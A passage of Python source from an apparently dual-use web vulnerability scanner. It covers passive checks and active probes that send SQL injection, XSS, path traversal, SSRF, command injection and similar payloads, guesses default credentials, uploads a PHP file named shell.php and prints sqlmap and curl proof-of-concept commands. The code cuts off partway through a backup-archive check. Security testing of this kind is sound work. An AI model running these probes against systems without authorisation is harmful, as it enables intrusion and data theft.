def check_api_key_leakage(resp, findings, cfg):
    section("[6] API Key Leakage", cfg)
    for pattern in API_KEY_PATTERNS:
        matches = re.findall(pattern, resp.text, re.IGNORECASE)
        for match in matches[:3]:
            key_val = match if isinstance(match, str) else (match[0] if match else "")
            if key_val:
                print_vuln("api_key_leakage", cfg,
                           detail=f"Potential key: {key_val[:20]}…",
                           url=resp.url)
                vadd(findings, "api_key_leakage", f"Key found: {key_val[:20]}…", resp.url)
                return  # one is enough to trigger the finding
    pr(f"  {G}✔ No obvious API keys in response.{RST}", cfg)


def check_outdated_server(resp, findings, cfg):
    section("[7] Outdated Server Detection", cfg)
    server_header = resp.headers.get("server", "")
    if not server_header:
        pr(f"  {G}✔ Server header not disclosed.{RST}", cfg)
        return
    for known_vuln, cve in KNOWN_CVE_VERSIONS.items():
        if known_vuln.lower() in server_header.lower():
            print_vuln("outdated_server", cfg,
                       detail=f"{server_header} → {cve}", url=resp.url)
            vadd(findings, "outdated_server", f"{server_header} ({cve})", resp.url)
            return
    pr(f"  {G}✔ Server: {server_header}{RST}", cfg)


def check_verbose_errors(resp, findings, cfg):
    section("[8] Verbose Error Messages", cfg)
    patterns = ["Traceback", "stack trace", "Exception in", "at line ", "Parse error",
                "Fatal error", "SyntaxError", "NullPointerException", "undefined method"]
    hit = next((p for p in patterns if p in resp.text), None)
    if hit:
        print_vuln("verbose_errors", cfg, detail=f"Pattern found: {hit!r}", url=resp.url)
        vadd(findings, "verbose_errors", f"Pattern: {hit!r}", resp.url)
    else:
        pr(f"  {G}✔ No verbose error messages detected.{RST}", cfg)


def check_debug_mode(resp, findings, cfg):
    section("[9] Debug Mode Detection", cfg)
    signs = ["debug=true", "debugmode=1", "__DEBUG__", "x-debug-token",
             "development=true", "APP_DEBUG=true", "DEBUG = True"]
    hit = next((s for s in signs if s.lower() in resp.text.lower()), None)
    if hit:
        print_vuln("debug_mode", cfg, detail=f"Indicator found: {hit!r}", url=resp.url)
        vadd(findings, "debug_mode", f"Indicator: {hit!r}", resp.url)
    else:
        pr(f"  {G}✔ No debug mode indicators.{RST}", cfg)


def check_weak_hash(resp, findings, cfg):
    section("[10] Weak Hash Algorithm", cfg)
    if re.search(r"\b(md5|sha1|sha-1|crc32|des\()\b", resp.text, re.I):
        print_vuln("weak_hash", cfg, detail="Weak algorithm reference in response", url=resp.url)
        vadd(findings, "weak_hash", "Weak algorithm reference", resp.url)
    else:
        pr(f"  {G}✔ No weak hash references.{RST}", cfg)


def check_csrf_missing(resp, params, findings, cfg):
    section("[11] CSRF Protection", cfg)
    html = resp.text
    if "form" in html.lower():
        has_csrf = bool(re.search(r'(csrf|_token|authenticity_token)', html, re.I))
        if not has_csrf:
            print_vuln("csrf_missing", cfg, detail="Forms present with no CSRF token", url=resp.url)
            vadd(findings, "csrf_missing", "No CSRF tokens in forms", resp.url)
            return
    pr(f"  {G}✔ CSRF tokens present or no forms found.{RST}", cfg)


def check_missing_x_frame(resp, findings, cfg):
    # Already included in check_headers, this is kept for legacy call sites
    pass


def check_metadata_exposure(resp, findings, cfg):
    section("[12] Metadata Exposure", cfg)
    if re.search(r"(Created|Modified|Author|Generator|Producer):\s*\S", resp.text):
        print_vuln("metadata_exposure", cfg, detail="File metadata exposed in response", url=resp.url)
        vadd(findings, "metadata_exposure", "Meta in response", resp.url)
    else:
        pr(f"  {G}✔ No obvious metadata exposure.{RST}", cfg)


def check_content_type_mismatch(resp, findings, cfg):
    section("[13] Content-Type Mismatch", cfg)
    ct = resp.headers.get("content-type", "").lower()
    xcto = resp.headers.get("x-content-type-options", "").lower()
    if xcto != "nosniff" and ("<script" in resp.text or "<?php" in resp.text):
        print_vuln("content_type_bypass", cfg,
                   detail=f"content-type: {ct}; X-Content-Type-Options: {xcto or 'missing'}",
                   url=resp.url)
        vadd(findings, "content_type_bypass", f"CT: {ct}; no nosniff", resp.url)
    else:
        pr(f"  {G}✔ Content-Type handling looks OK.{RST}", cfg)


def check_excessive_data_exposure(resp, findings, cfg):
    section("[14] Excessive Data Exposure", cfg)
    # Look for arrays of objects with sensitive fields in JSON responses
    ct = resp.headers.get("content-type", "")
    if "json" not in ct:
        pr(f"  {G}✔ Not a JSON response; skipping.{RST}", cfg)
        return
    try:
        data = resp.json()
        dump = json.dumps(data).lower()
        sensitive = ["password", "secret", "private_key", "api_key", "ssn",
                     "credit_card", "cvv", "pin", "dob", "social_security"]
        found = [s for s in sensitive if s in dump]
        if found:
            print_vuln("excessive_data_exposure", cfg,
                       detail=f"Sensitive fields in JSON: {', '.join(found)}", url=resp.url)
            vadd(findings, "excessive_data_exposure", f"Fields: {', '.join(found)}", resp.url)
        else:
            pr(f"  {G}✔ No sensitive fields in JSON response.{RST}", cfg)
    except (ValueError, Exception):
        pr(f"  {G}✔ Response is not valid JSON.{RST}", cfg)


def check_weak_cors_config_again(resp, findings, cfg):
    # Already handled in check_cors; stub kept for call-site compat
    pass


# ══════════════════════════════════════════════════════════════════════════
# ACTIVE CHECKS (send additional HTTP requests)
# ══════════════════════════════════════════════════════════════════════════

def check_crypto_exposure(target, session, params, findings, cfg):
    section("[15] Crypto / Secret Key in URL Parameters", cfg)
    suspicious = [p for p in params if any(x in p.lower() for x in CRYPTO_PARAMS)]
    if suspicious:
        for p in suspicious:
            url = f"{target}?{p}=test"
            print_vuln("crypto_key_exposure", cfg,
                       detail=f"Sensitive parameter name '{p}' in URL", url=url,
                       poc=f"curl '{url}'")
            vadd(findings, "crypto_key_exposure", f"Param: {p}", url)
    else:
        pr(f"  {G}✔ No crypto-related parameters in query strings.{RST}", cfg)


def check_sqli(target, session, params, forms, findings, cfg):
    section("[16] SQL Injection", cfg)
    if not params:
        params = ["id", "q", "search", "cat", "item"]

    found = []

    def test_get(p, payload):
        url = f"{target}?{p}={urllib.parse.quote(payload)}"
        r = req(session, url, cfg)
        if r:
            text_lower = r.text.lower()
            if any(sig in text_lower for sig in SQLI_ERRORS):
                return (p, payload, url)
        return None

    def test_post(p, payload, action):
        r = req(session, action, cfg, method="POST", data={p: payload})
        if r:
            text_lower = r.text.lower()
            if any(sig in text_lower for sig in SQLI_ERRORS):
                return (p, payload, action)
        return None

    post_inputs = []
    for form in forms:
        if form.get("method", "").lower() == "post":
            post_inputs.extend(form.get("inputs", []))

    total = len(params) * len(SQLI_PAYLOADS) + len(post_inputs) * len(SQLI_PAYLOADS)
    with make_bar(total, "SQLi Scan", cfg) as bar:
        with ThreadPoolExecutor(max_workers=cfg.threads) as ex:
            futures = {}
            for p in params:
                for pl in SQLI_PAYLOADS:
                    futures[ex.submit(test_get, p, pl)] = (p, pl, "GET")
            for p in post_inputs:
                for pl in SQLI_PAYLOADS:
                    action = next(
                        (f["action_url"] for f in forms if p in f.get("inputs", [])),
                        target
                    )
                    futures[ex.submit(test_post, p, pl, action)] = (p, pl, "POST")
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        found.append(res)
                except Exception as e:
                    dbg(f"SQLi future error: {e}", cfg)
                bar.update()

    if found:
        for p, pl, url in found:
            poc = f"sqlmap -u '{url}' -p {p} --batch --dbs"
            print_vuln("sql_injection", cfg, detail=f"Param: {p}", url=url, poc=poc)
            vadd(findings, "sql_injection", f"Param: {p}", url, poc=poc)
    else:
        pr(f"  {G}✔ No SQL Injection found.{RST}", cfg)


def check_timing_sqli(target, session, params, findings, cfg):
    section("[17] Timing-Based SQL Injection", cfg)
    if not params:
        params = ["id", "q", "search"]

    if len(params) > 5:
        pr(f"  {Y}ℹ Testing first 5 params (of {len(params)}) for timing SQLi.{RST}", cfg)
        params = params[:5]

    found = []

    def test_timing(p, payload):
        url = f"{target}?{p}={urllib.parse.quote(payload)}"
        try:
            start = time.time()
            req(session, url, cfg, timeout=12)
            elapsed = time.time() - start
            if elapsed >= 4.5:
                return (p, payload, url, elapsed)
        except Exception as e:
            dbg(f"Timing SQLi error: {e}", cfg)
        return None

    total = len(params) * len(SQLI_TIME_PAYLOADS)
    with make_bar(total, "Timing SQLi", cfg) as bar:
        with ThreadPoolExecutor(max_workers=3) as ex:
            futures = {ex.submit(test_timing, p, pl): (p, pl)
                       for p in params for pl in SQLI_TIME_PAYLOADS}
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        found.append(res)
                except Exception as e:
                    dbg(f"Timing SQLi future error: {e}", cfg)
                bar.update()

    if found:
        for p, pl, url, t in found:
            print_vuln("timing_sqli", cfg, detail=f"Param: {p}, delay {t:.2f}s", url=url)
            vadd(findings, "timing_sqli", f"Param: {p}, delay {t:.2f}s", url)
    else:
        pr(f"  {G}✔ No timing-based SQLi detected.{RST}", cfg)


def check_xss(target, session, params, forms, findings, cfg):
    section("[18] Reflected XSS", cfg)
    if not params:
        params = ["q", "search", "name", "input", "data"]

    post_inputs = []
    for form in forms:
        if form.get("method", "").lower() == "post":
            post_inputs.extend(form.get("inputs", []))

    found = []

    def test_get(p, payload):
        url = f"{target}?{p}={urllib.parse.quote(payload)}"
        r = req(session, url, cfg)
        if r and payload in r.text:
            return (p, payload, url)
        return None

    def test_post(p, payload, action):
        r = req(session, action, cfg, method="POST", data={p: payload})
        if r and payload in r.text:
            return (p, payload, action)
        return None

    total = len(params) * len(XSS_PAYLOADS) + len(post_inputs) * len(XSS_PAYLOADS)
    with make_bar(total, "XSS Scan", cfg) as bar:
        with ThreadPoolExecutor(max_workers=cfg.threads) as ex:
            futures = {}
            for p in params:
                for pl in XSS_PAYLOADS:
                    futures[ex.submit(test_get, p, pl)] = (p, pl)
            for p in post_inputs:
                for pl in XSS_PAYLOADS:
                    action = next(
                        (f["action_url"] for f in forms if p in f.get("inputs", [])),
                        target
                    )
                    futures[ex.submit(test_post, p, pl, action)] = (p, pl)
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        found.append(res)
                except Exception as e:
                    dbg(f"XSS future error: {e}", cfg)
                bar.update()

    if found:
        for p, pl, url in found:
            poc = f"# Visit: {url}"
            print_vuln("xss_reflected", cfg, detail=f"Param: {p}", url=url, poc=poc)
            vadd(findings, "xss_reflected", f"Param: {p}", url, poc=poc)
    else:
        pr(f"  {G}✔ No reflected XSS found.{RST}", cfg)


def check_open_redirect(target, session, params, findings, cfg):
    section("[19] Open Redirect", cfg)
    if not params:
        params = ["redirect", "url", "return", "target", "next", "goto"]
    found = []

    def test(p, payload):
        url = f"{target}?{p}={urllib.parse.quote(payload)}"
        try:
            r = session.head(url, timeout=cfg.timeout, allow_redirects=False,
                             verify=cfg.verify_ssl)
            loc = r.headers.get("location", "")
            if loc and "evil.com" in loc:
                return (p, payload, url, loc)
        except (requests.RequestException, Exception) as e:
            dbg(f"Redirect check error: {e}", cfg)
        return None

    with make_bar(len(params) * len(REDIRECT_PAYLOADS), "Redirect Scan", cfg) as bar:
        for p in params:
            for payload in REDIRECT_PAYLOADS:
                res = test(p, payload)
                if res:
                    found.append(res)
                bar.update()

    if found:
        for p, pl, url, loc in found:
            poc = f"curl -i -L '{url}'"
            print_vuln("open_redirect", cfg, detail=f"Param: {p} → {loc}", url=url, poc=poc)
            vadd(findings, "open_redirect", f"Param: {p} → {loc}", url, poc=poc)
    else:
        pr(f"  {G}✔ No open redirects detected.{RST}", cfg)


def check_path_traversal(target, session, params, findings, cfg):
    section("[20] Path Traversal", cfg)
    if not params:
        params = ["file", "path", "doc", "download", "page"]
    sigs = ["root:", "[boot loader]", "etc/passwd", "win.ini"]
    found = []

    def test(p, payload):
        url = f"{target}?{p}={urllib.parse.quote(payload)}"
        r = req(session, url, cfg)
        if r and any(s in r.text.lower() for s in sigs):
            return (p, payload, url)
        return None

    total = len(params) * len(PATH_TRAVERSAL_PAYLOADS)
    with make_bar(total, "Path Traversal", cfg) as bar:
        with ThreadPoolExecutor(max_workers=cfg.threads) as ex:
            futures = {ex.submit(test, p, pl): (p, pl)
                       for p in params for pl in PATH_TRAVERSAL_PAYLOADS}
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        found.append(res)
                except Exception as e:
                    dbg(f"Traversal future error: {e}", cfg)
                bar.update()

    if found:
        for p, pl, url in found:
            poc = f"curl -k '{url}'"
            print_vuln("directory_traversal", cfg, detail=f"Param: {p}", url=url, poc=poc)
            vadd(findings, "directory_traversal", f"Param: {p}", url, poc=poc)
    else:
        pr(f"  {G}✔ No path traversal detected.{RST}", cfg)


def check_ssrf(target, session, params, findings, cfg):
    section("[21] SSRF", cfg)
    if not params:
        params = ["url", "uri", "path", "domain", "site", "endpoint"]
    found = []

    def test(p, payload):
        url = f"{target}?{p}={urllib.parse.quote(payload)}"
        r = req(session, url, cfg)
        if r and ("metadata.google.internal" in r.text or "ami-id" in r.text
                  or "169.254.169.254" in r.text):
            return (p, payload, url)
        return None

    total = len(params) * len(SSRF_PAYLOADS)
    with make_bar(total, "SSRF Scan", cfg) as bar:
        with ThreadPoolExecutor(max_workers=cfg.threads) as ex:
            futures = {ex.submit(test, p, pl): (p, pl)
                       for p in params for pl in SSRF_PAYLOADS}
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        found.append(res)
                except Exception as e:
                    dbg(f"SSRF future error: {e}", cfg)
                bar.update()

    if found:
        for p, pl, url in found:
            poc = f"curl -k '{url}'"
            print_vuln("ssrf", cfg, detail=f"Param: {p}, cloud metadata in response", url=url, poc=poc)
            vadd(findings, "ssrf", f"Param: {p}", url, poc=poc)
    else:
        pr(f"  {G}✔ No SSRF response-content indicators found.{RST}", cfg)


def check_ssti(target, session, params, findings, cfg):
    section("[22] SSTI Detection", cfg)
    if not params:
        params = ["name", "template", "view", "lang", "q"]
    found = []

    def test_ssti(p, payload):
        url = f"{target}?{p}={urllib.parse.quote(payload)}"
        r = req(session, url, cfg)
        if r and "49" in r.text and payload not in r.text:
            # The math was evaluated (7*7=49) and the raw template syntax is gone
            return (p, payload, url)
        return None

    total = len(params) * len(SSTI_PAYLOADS)
    with make_bar(total, "SSTI Scan", cfg) as bar:
        with ThreadPoolExecutor(max_workers=cfg.threads) as ex:
            futures = {ex.submit(test_ssti, p, pl): (p, pl)
                       for p in params for pl in SSTI_PAYLOADS}
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        found.append(res)
                except Exception as e:
                    dbg(f"SSTI future error: {e}", cfg)
                bar.update()

    if found:
        for p, pl, url in found:
            poc = f"curl -k '{url}'  # Look for '49' (7*7 computed by template engine)"
            print_vuln("ssti", cfg, detail=f"Param: {p}, payload: {pl}", url=url, poc=poc)
            vadd(findings, "ssti", f"Param: {p}", url, poc=poc)
    else:
        pr(f"  {G}✔ No SSTI detected.{RST}", cfg)


def check_xxe(target, session, params, findings, cfg):
    section("[23] XXE Detection", cfg)
    if not params:
        params = ["xml", "data", "body"]
    found = []

    def test_xxe(p):
        r = req(session, target, cfg, method="POST",
                data={p: XXE_PAYLOAD},
                headers={"Content-Type": "application/xml"})
        if r and ("root:" in r.text or "etc/passwd" in r.text):
            return (p, target)
        return None

    with make_bar(len(params), "XXE Scan", cfg) as bar:
        for p in params:
            try:
                res = test_xxe(p)
                if res:
                    found.append(res)
            except Exception as e:
                dbg(f"XXE check error: {e}", cfg)
            bar.update()

    if found:
        for p, url in found:
            poc = f"POST {url} with XML payload: {XXE_PAYLOAD[:60]}…"
            print_vuln("xxe", cfg, detail=f"Param: {p}", url=url, poc=poc)
            vadd(findings, "xxe", f"Param: {p}", url, poc=poc)
    else:
        pr(f"  {G}✔ No XXE detected.{RST}", cfg)


def check_command_injection(target, session, params, findings, cfg):
    section("[24] Command Injection", cfg)
    if not params:
        params = ["cmd", "command", "exec", "system", "q"]
    found = []

    def test_cmd(p, payload):
        url = f"{target}?{p}={urllib.parse.quote(payload)}"
        r = req(session, url, cfg)
        if r and ("root:" in r.text or "uid=" in r.text or "bin/bash" in r.text):
            return (p, payload, url)
        return None

    total = len(params) * len(CMD_INJECTION_PAYLOADS)
    with make_bar(total, "Command Injection", cfg) as bar:
        with ThreadPoolExecutor(max_workers=cfg.threads) as ex:
            futures = {ex.submit(test_cmd, p, pl): (p, pl)
                       for p in params for pl in CMD_INJECTION_PAYLOADS}
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        found.append(res)
                except Exception as e:
                    dbg(f"CMDi future error: {e}", cfg)
                bar.update()

    if found:
        for p, pl, url in found:
            poc = f"curl -k '{url}'  # Look for 'root:' or 'uid='"
            print_vuln("command_injection", cfg, detail=f"Param: {p}", url=url, poc=poc)
            vadd(findings, "command_injection", f"Param: {p}", url, poc=poc)
    else:
        pr(f"  {G}✔ No command injection detected.{RST}", cfg)


def check_ldap_injection(target, session, params, findings, cfg):
    section("[25] LDAP Injection", cfg)
    if not params:
        params = ["search", "filter", "user", "query", "q"]
    found = []

    def test_ldap(p, payload):
        url = f"{target}?{p}={urllib.parse.quote(payload)}"
        r = req(session, url, cfg)
        # A wildcard (*) returning 200 when a normal query returns 400/empty is suspicious
        if r and r.status_code == 200 and len(r.content) > 100:
            return (p, payload, url)
        return None

    total = len(params) * len(LDAP_INJECTION_PAYLOADS)
    with make_bar(total, "LDAP Scan", cfg) as bar:
        with ThreadPoolExecutor(max_workers=cfg.threads) as ex:
            futures = {ex.submit(test_ldap, p, pl): (p, pl)
                       for p in params for pl in LDAP_INJECTION_PAYLOADS}
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        found.append(res)
                except Exception as e:
                    dbg(f"LDAP future error: {e}", cfg)
                bar.update()

    if found:
        for p, pl, url in found:
            poc = f"curl -k '{url}'"
            print_vuln("ldap_injection", cfg, detail=f"Param: {p}", url=url, poc=poc)
            vadd(findings, "ldap_injection", f"Param: {p}", url, poc=poc)
    else:
        pr(f"  {G}✔ No LDAP injection detected.{RST}", cfg)


def check_idor(target, session, params, findings, cfg):
    section("[26] IDOR", cfg)
    id_params = [p for p in params if any(x in p.lower() for x in ["id", "user", "account", "profile"])]
    if not id_params:
        pr(f"  {G}✔ No ID-like parameters found.{RST}", cfg)
        return
    for param in id_params[:3]:
        for test_id in ["1", "2", "999", "admin"]:
            url = f"{target}?{param}={test_id}"
            r = req(session, url, cfg)
            if r and r.status_code == 200:
                poc = f"curl -k '{url}'  # Access without authorization check?"
                pr(f"  {Y}⚠ Param '{param}'='{test_id}' returns 200 — possible IDOR{RST}", cfg)
                print_vuln("idor", cfg, detail=f"Param: {param}, value: {test_id}", url=url, poc=poc)
                vadd(findings, "idor", f"Param: {param}", url, poc=poc)
                break


def check_host_header(target, session, findings, cfg):
    section("[27] Host Header Injection", cfg)
    r = req(session, target, cfg, headers={"Host": "evil-canary.com"})
    if r and "evil-canary.com" in r.text:
        poc = f"curl -H 'Host: evil-canary.com' '{target}'"
        print_vuln("host_header_injection", cfg,
                   detail="Host header value reflected in response body", url=target, poc=poc)
        vadd(findings, "host_header_injection", "Host reflected", target, poc=poc)
    else:
        pr(f"  {G}✔ Host header not reflected.{RST}", cfg)


def check_backup_files(target, session, findings, cfg):
    section("[28] Backup File Exposure", cfg)
    found_backups = []

    def check_one(file_path, ext):
        url = target.rstrip("/") + file_path + ext
        try:
            r = session.head(url, timeout=cfg.timeout, verify=cfg.verify_ssl)
            if r and r.status_code in (200, 403):
                return (ext, url, r.status_code)
        except (requests.RequestException, Exception) as e:
            dbg(f"Backup head error {url}: {e}", cfg)
        return None

    total = len(BACKUP_EXTENSIONS) * len(COMMON_FILES)
    with make_bar(total, "Backup Files", cfg) as bar:
        with ThreadPoolExecutor(max_workers=5) as ex:
            futures = {ex.submit(check_one, fp, ext): (fp, ext)
                       for fp in COMMON_FILES for ext in BACKUP_EXTENSIONS}
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        found_backups.append(res)
                except Exception as e:
                    dbg(f"Backup future error: {e}", cfg)
                bar.update()

    if found_backups:
        for ext, url, status in found_backups:
            note = "(accessible)" if status == 200 else "(exists but restricted)"
            print_vuln("backup_file_exposure", cfg, detail=f"{ext} {note}", url=url,
                       poc=f"curl -k '{url}'")
            vadd(findings, "backup_file_exposure", f"File: {ext} {note}", url)
    else:
        pr(f"  {G}✔ No backup files found.{RST}", cfg)


def check_http_methods(target, session, findings, cfg):
    section("[29] Dangerous HTTP Methods", cfg)
    dangerous = ["PUT", "DELETE", "TRACE", "CONNECT"]
    found_methods = []
    for method in dangerous:
        r = req(session, target, cfg, method=method)
        if r and r.status_code not in (404, 405, 501):
            found_methods.append(method)
    if found_methods:
        poc = f"curl -X {found_methods[0]} '{target}'"
        print_vuln("http_method_allowed", cfg,
                   detail=f"Methods enabled: {', '.join(found_methods)}", url=target, poc=poc)
        vadd(findings, "http_method_allowed", f"Methods: {', '.join(found_methods)}", target, poc=poc)
    else:
        pr(f"  {G}✔ Dangerous HTTP methods not enabled.{RST}", cfg)


def check_default_credentials(target, session, findings, cfg):
    section("[30] Default Credentials", cfg)
    found_creds = []
    login_paths = ["/login", "/admin/login", "/administrator", "/wp-login.php"]
    for username, password in DEFAULT_CREDENTIALS:
        for path in login_paths:
            url = target.rstrip("/") + path
            try:
                data = {"username": username, "password": password,
                        "user": username, "pass": password}
                r = session.post(url, data=data, timeout=5, verify=cfg.verify_ssl,
                                 allow_redirects=True)
                if r and r.status_code == 200:
                    body = r.text.lower()
                    if "dashboard" in body or "logout" in body or "welcome" in body:
                        found_creds.append((username, password, url))
                        break
            except (requests.RequestException, Exception) as e:
                dbg(f"Default creds check {url}: {e}", cfg)
    if found_creds:
        for user, pwd, url in found_creds:
            poc = f"curl -X POST '{url}' -d 'username={user}&password={pwd}'"
            print_vuln("default_credentials", cfg, detail=f"{user}:{pwd}", url=url, poc=poc)
            vadd(findings, "default_credentials", f"{user}:{pwd}", url, poc=poc)
    else:
        pr(f"  {G}✔ No default credentials accepted.{RST}", cfg)


def check_ssl_tls(target, session, findings, cfg):
    section("[31] SSL/TLS Configuration", cfg)
    if not target.startswith("https://"):
        pr(f"  {Y}ℹ Target is HTTP — skipping TLS check.{RST}", cfg)
        return
    try:
        hostname = urllib.parse.urlparse(target).hostname
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        # Try to force legacy protocol (will fail on modern stacks)
        try:
            ctx.minimum_version = ssl.TLSVersion.TLSv1
            ctx.maximum_version = ssl.TLSVersion.TLSv1
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname):
                    print_vuln("weak_ssl_tls", cfg,
                               detail="TLS 1.0 accepted", url=target)
                    vadd(findings, "weak_ssl_tls", "TLS 1.0 accepted", target)
                    return
        except (ssl.SSLError, AttributeError, OSError):
            pass  # TLS 1.0 rejected — that's expected and good
        pr(f"  {G}✔ TLS 1.0 not accepted.{RST}", cfg)
    except Exception as e:
        dbg(f"TLS check error: {e}", cfg)


def check_rate_limiting(target, session, findings, cfg):
    section("[32] Rate Limiting", cfg)
    statuses = []
    for _ in range(15):
        try:
            r = session.get(target, timeout=3, verify=cfg.verify_ssl)
            statuses.append(r.status_code)
        except (requests.RequestException, Exception) as e:
            dbg(f"Rate limit probe error: {e}", cfg)
    if statuses and 429 not in statuses:
        print_vuln("rate_limiting", cfg, detail="15 rapid requests received no 429", url=target)
        vadd(findings, "rate_limiting", "No rate limiting detected", target)
    else:
        pr(f"  {G}✔ Rate limiting in place.{RST}", cfg)


def check_crlf_injection(target, session, params, findings, cfg):
    section("[33] CRLF Injection", cfg)
    for p in (params or ["url", "redirect"])[:3]:
        payload = "%0d%0aSet-Cookie:+injected=crlf"
        url = f"{target}?{p}={payload}"
        try:
            r = session.get(url, timeout=cfg.timeout, verify=cfg.verify_ssl)
            if r and "injected" in str(r.headers).lower():
                poc = f"curl -v '{url}' | grep -i set-cookie"
                print_vuln("crlf_injection", cfg, detail=f"Param: {p}", url=url, poc=poc)
                vadd(findings, "crlf_injection", f"Param: {p}", url, poc=poc)
                return
        except (requests.RequestException, Exception) as e:
            dbg(f"CRLF check error: {e}", cfg)
    pr(f"  {G}✔ No CRLF injection detected.{RST}", cfg)


def check_directory_listing(target, session, findings, cfg):
    section("[34] Directory Listing", cfg)
    test_paths = [target.rstrip("/") + "/" + d for d in ["", "static/", "assets/", "images/"]]
    for url in test_paths:
        try:
            r = session.get(url, timeout=cfg.timeout, verify=cfg.verify_ssl)
            if r and r.status_code == 200:
                if any(x in r.text for x in ["Index of ", "<title>Index", "Parent Directory"]):
                    print_vuln("directory_listing", cfg, detail="Directory listing enabled", url=url,
                               poc=f"curl -k '{url}'")
                    vadd(findings, "directory_listing", "Listing enabled", url)
                    return
        except (requests.RequestException, Exception) as e:
            dbg(f"Dir listing check error: {e}", cfg)
    pr(f"  {G}✔ No directory listing detected.{RST}", cfg)


def check_source_code_disclosure(target, session, findings, cfg):
    section("[35] Source Code / Config Exposure", cfg)
    sensitive_paths = ["/.git/HEAD", "/.git/config", "/.env", "/.env.local",
                       "/web.config", "/config.php", "/.htpasswd", "/composer.json",
                       "/package.json", "/.npmrc"]
    found = False
    for path in sensitive_paths:
        url = target.rstrip("/") + path
        try:
            r = session.head(url, timeout=3, verify=cfg.verify_ssl)
            if r and r.status_code in (200, 403):
                note = "accessible" if r.status_code == 200 else "exists (restricted)"
                print_vuln("source_code_disclosure", cfg,
                           detail=f"{path} — {note}", url=url,
                           poc=f"curl -k '{url}'")
                vadd(findings, "source_code_disclosure", f"Path: {path} ({note})", url)
                found = True
        except (requests.RequestException, Exception) as e:
            dbg(f"Source disclosure check error {path}: {e}", cfg)
    if not found:
        pr(f"  {G}✔ No sensitive files/configs found.{RST}", cfg)


def check_nosql_injection(target, session, params, findings, cfg):
    section("[36] NoSQL Injection", cfg)
    payloads = ["{'$ne': null}", '{"$where": "1"}', "admin',$or:[{},"]
    for p in (params or ["q", "search", "user"])[:3]:
        for payload in payloads:
            try:
                url = f"{target}?{p}={urllib.parse.quote(payload)}"
                r = session.get(url, timeout=cfg.timeout, verify=cfg.verify_ssl)
                if r and r.status_code == 200 and len(r.content) > 200:
                    poc = f"curl -k '{url}'"
                    print_vuln("nosql_injection", cfg, detail=f"Param: {p}", url=url, poc=poc)
                    vadd(findings, "nosql_injection", f"Param: {p}", url, poc=poc)
                    return
            except (requests.RequestException, Exception) as e:
                dbg(f"NoSQL injection check error: {e}", cfg)
    pr(f"  {G}✔ No NoSQL injection detected.{RST}", cfg)


def check_graphql_introspection(target, session, findings, cfg):
    section("[37] GraphQL Introspection", cfg)
    endpoints = ["/graphql", "/api/graphql", "/query", "/graphql/v1"]
    for ep in endpoints:
        url = target.rstrip("/") + ep
        try:
            r = session.post(url, json={"query": "{__schema{types{name}}}"},
                             timeout=5, verify=cfg.verify_ssl)
            if r and r.status_code == 200 and "__schema" in r.text:
                poc = f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}'"
                print_vuln("graphql_introspection", cfg,
                           detail="Schema introspection enabled", url=url, poc=poc)
                vadd(findings, "graphql_introspection", "Introspection enabled", url, poc=poc)
                return
        except (requests.RequestException, Exception) as e:
            dbg(f"GraphQL introspection check error: {e}", cfg)
    pr(f"  {G}✔ GraphQL introspection not exposed.{RST}", cfg)


def check_prototype_pollution(target, session, findings, cfg):
    section("[38] Prototype Pollution", cfg)
    url = f"{target}?__proto__[x]=polluted&constructor[prototype][x]=polluted"
    try:
        r = session.get(url, timeout=cfg.timeout, verify=cfg.verify_ssl)
        if r and "polluted" in r.text:
            poc = f"curl -k '{url}'"
            print_vuln("prototype_pollution", cfg,
                       detail="__proto__ property reflected", url=url, poc=poc)
            vadd(findings, "prototype_pollution", "Proto polluted", url, poc=poc)
        else:
            pr(f"  {G}✔ No prototype pollution detected.{RST}", cfg)
    except (requests.RequestException, Exception) as e:
        dbg(f"Prototype pollution check error: {e}", cfg)
        pr(f"  {G}✔ Prototype pollution check inconclusive.{RST}", cfg)


def check_insecure_deserialization(target, session, findings, cfg):
    section("[39] Insecure Deserialization", cfg)
    payloads = [
        ('application/x-www-form-urlencoded', {"data": 'O:4:"Test":0:{}'}, "PHP object injection"),
        ('application/json', '{"__class__":"os.system","args":["id"]}', "Python pickle-style"),
    ]
    for ct, payload, label in payloads:
        try:
            headers = {"Content-Type": ct}
            if isinstance(payload, dict):
                r = session.post(target, data=payload, headers=headers,
                                 timeout=cfg.timeout, verify=cfg.verify_ssl)
            else:
                r = session.post(target, data=payload, headers=headers,
                                 timeout=cfg.timeout, verify=cfg.verify_ssl)
            if r and r.status_code == 200 and ("uid=" in r.text or "root:" in r.text):
                print_vuln("insecure_deserialization", cfg, detail=label, url=target)
                vadd(findings, "insecure_deserialization", label, target)
                return
        except (requests.RequestException, Exception) as e:
            dbg(f"Deserialization check error: {e}", cfg)
    pr(f"  {G}✔ No obvious deserialization issues.{RST}", cfg)


def check_file_upload_issues(target, session, findings, cfg):
    section("[40] Insecure File Upload", cfg)
    upload_paths = [target.rstrip("/") + p for p in ["/upload", "/api/upload", "/file/upload"]]
    for url in upload_paths:
        try:
            files = {"file": ("shell.php", b"<?php phpinfo(); ?>", "image/jpeg")}
            r = session.post(url, files=files, timeout=cfg.timeout, verify=cfg.verify_ssl)
            if r and r.status_code in (200, 201):
                if ".php" in r.text or "upload" in r.text.lower():
                    print_vuln("file_upload_issues", cfg,
                               detail="Server accepted .php file with image/jpeg MIME", url=url)
                    vadd(findings, "file_upload_issues", "PHP upload with image MIME", url)
                    return
        except (requests.RequestException, Exception) as e:
            dbg(f"File upload check error {url}: {e}", cfg)
    pr(f"  {G}✔ No obvious file upload issues.{RST}", cfg)


def check_backup_archives(target, session, findings, cfg):
    section("[41] Backup Archives", cfg)
    domain = urllib.parse.urlparse(target).netloc.split(":")[0]
    archives = [
        f"/{domain}.tar.gz", f"/{domain}.zip", f"/backup.tar.gz",
